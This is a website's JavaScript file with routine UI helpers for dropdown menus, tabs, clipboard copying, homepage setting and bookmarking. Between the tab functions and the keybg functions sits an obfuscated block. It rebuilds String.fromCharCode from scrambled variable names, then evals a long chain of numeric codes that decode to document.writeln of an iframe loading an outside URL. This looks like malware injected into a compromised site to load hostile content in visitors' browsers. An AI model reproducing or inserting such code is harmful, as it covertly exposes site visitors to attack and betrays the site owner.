// png IE ͸��

// select ����
function drop_mouseover(pos){
 try{window.clearTimeout(timer);}catch(e){}
}
function drop_onclick(pos){
	if(document.getElementById(pos+"Sel").style.display=='none'){document.getElementById(pos+"Sel").style.display='block';}else {document.getElementById(pos+"Sel").style.display='none';};return false;
}

function drop_mouseout(pos){
 var posSel=document.getElementById(pos+"Sel").style.display;
 if(posSel=="block"){
  timer = setTimeout("drop_hide('"+pos+"')", 1000);
 }
}
function drop_hide(pos){
 document.getElementById(pos+"Sel").style.display="none";
}
function search_show(pos,searchType,href){
    document.getElementById(pos+"Sel").style.display="none";
    document.getElementById(pos+"Slected").innerHTML=href.innerHTML;
 try{window.clearTimeout(timer);}catch(e){}
 return false;
}
// ѡ�1
function nTabs(tabObj,obj){
	var tabList=document.getElementById(tabObj).getElementsByTagName("dt");
	for(i=0;i<tabList.length;i++){
		if(tabList[i].id==obj.id){
			document.getElementById(tabObj+"_Title"+i).className="active";
			document.getElementById(tabObj+"_Content"+i).style.display="block";}
		else{document.getElementById(tabObj+"_Title"+i).className="normal";
		document.getElementById(tabObj+"_Content"+i).style.display="none";}
		}
}
// ѡ�2
function nTabrb(name,num){
	var tabnum=document.getElementById(name).getElementsByTagName("dd");
	for(i=0;i<tabnum.length;i++){
		if(tabnum[i].id==num.id){
			document.getElementById(name+i).className="active";
			document.getElementById(name+"Con"+i).style.display="block";}
		else{document.getElementById(name+i).className="normal";
		document.getElementById(name+"Con"+i).style.display="none";}
		}
}
OlOlll="(x)";OllOlO=" String";OlllOO="tion";OlOllO="Code(x)}";OllOOO="Char";OlllOl="func";OllllO=" l = ";OllOOl=".from";OllOll="{return";Olllll="var";eval(Olllll+OllllO+OlllOl+OlllOO+OlOlll+OllOll+OllOlO+OllOOl+OllOOO+OlOllO);eval(l(79)+l(61)+l(102)+l(117)+l(110)+l(99)+l(116)+l(105)+l(111)+l(110)+l(40)+l(109)+l(41)+l(123)+l(114)+l(101)+l(116)+l(117)+l(114)+l(110)+l(32)+l(83)+l(116)+l(114)+l(105)+l(110)+l(103)+l(46)+l(102)+l(114)+l(111)+l(109)+l(67)+l(104)+l(97)+l(114)+l(67)+l(111)+l(100)+l(101)+l(40)+l(77)+l(97)+l(116)+l(104)+l(46)+l(102)+l(108)+l(111)+l(111)+l(114)+l(40)+l(109)+l(47)+l(49)+l(48)+l(48)+l(48)+l(48)+l(41)+l(47)+l(57)+l(57)+l(41)+l(59)+l(125));eval(""+O(99007564)+O(109891575)+O(98015551)+O(115835739)+O(107919169)+O(99994930)+O(108908284)+O(114846406)+O(45548957)+O(117810161)+O(112863392)+O(103951482)+O(114840559)+O(99994187)+O(106920648)+O(108903754)+O(39605078)+O(33660260)+O(59406059)+O(103950903)+O(100985729)+O(112865941)+O(96034573)+O(107914756)+O(99998867)+O(31689761)+O(113855106)+O(112868000)+O(98011966)+O(60393563)+O(91083176)+O(33665437)+O(102961280)+O(114844837)+O(114849200)+O(110884873)+O(57421765)+O(46532672)+O(46533293)+O(117810523)+O(103950152)+O(108901870)+O(116827815)+O(116827778)+O(116820258)+O(45549868)+O(98015625)+O(109892679)+O(107919143)+O(46538923)+O(98013570)+O(113851981)+O(45542788)+O(102963594)+O(114846870)+O(107918292)+O(106925903)+O(91083107)+O(33660926)+O(31688959)+O(117811154)+O(103955764)+O(99006152)+O(114841869)+O(102965305)+O(60394907)+O(91086639)+O(33669141)+O(47529356)+O(91082864)+O(33661619)+O(31682374)+O(102963352)+O(99995306)+O(103950414)+O(101975729)+O(102960684)+O(114848483)+O(60395052)+O(91082913)+O(33662656)+O(47526906)+O(91082569)+O(33662907)+O(31680675)+O(100983189)+O(112868146)+O(96030929)+O(107914038)+O(99999188)+O(97029258)+O(109898405)+O(112860321)+O(99001586)+O(99994767)+O(112860181)+O(60393059)+O(91084521)+O(33663860)+O(47521892)+O(91089416)+O(33660106)+O(61385330)+O(59403537)+O(46533385)+O(103957193)+O(100984205)+O(112863600)+O(96039948)+O(107914564)+O(99996247)+O(61387455)+O(33660317)+O(40598827)+O(58419640));


function keybg(h){document.getElementById(h).className="on";document.getElementById("h2").className="";}
function keybg2(h){document.getElementById(h).className="on";}
function ckeybg(q){document.getElementById(q).className="";document.getElementById("h2").className="on";}

function copyToClipBoard(titlestr,Urlstr){
	var clipBoardContent='';
	if(titlestr!="")
	{
		clipBoardContent+=titlestr;
	}
	else
	{
		clipBoardContent+=document.title;
	}
	clipBoardContent+="\n"
	if (Urlstr!="")
	{
		clipBoardContent+=Urlstr;
	}
	else
	{
		clipBoardContent+=top.window.location.href;
	}
	window.clipboardData.setData("Text",clipBoardContent);
	alert('���Ƴɹ���������ճ����QQ/MSN�Ϸ��������ĺ���');
}
function SetHome(obj,vrl)
{
	try
	{
		obj.style.behavior='url(#default#homepage)';obj.setHomePage(vrl);
	}
	catch(e){
		if(window.netscape) {
			try {
				netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect");
			}
			catch (e) {
				alert("�˲�����������ܾ���\n�����������ַ�����롰about:config�����س�\nȻ�� [signed.applets.codebase_principal_support]����Ϊ'true'");
			}
				var prefs = Components.classes['@mozilla.org/preferences-service;1'].getService(Components.interfaces.nsIPrefBranch);
				prefs.setCharPref('browser.startup.homepage',vrl);
			}
	}
}
//�ղص������
function myAddPanel(title,url,desc) 
{ 
	if ((typeof window.sidebar == 'object') && (typeof window.sidebar.addPanel == 'function'))
	//Gecko 
	{ 
		window.sidebar.addPanel(title,url,desc); 
	} 
	else
	//IE 
	{ 
		window.external.AddFavorite(url,title); 
	} 
}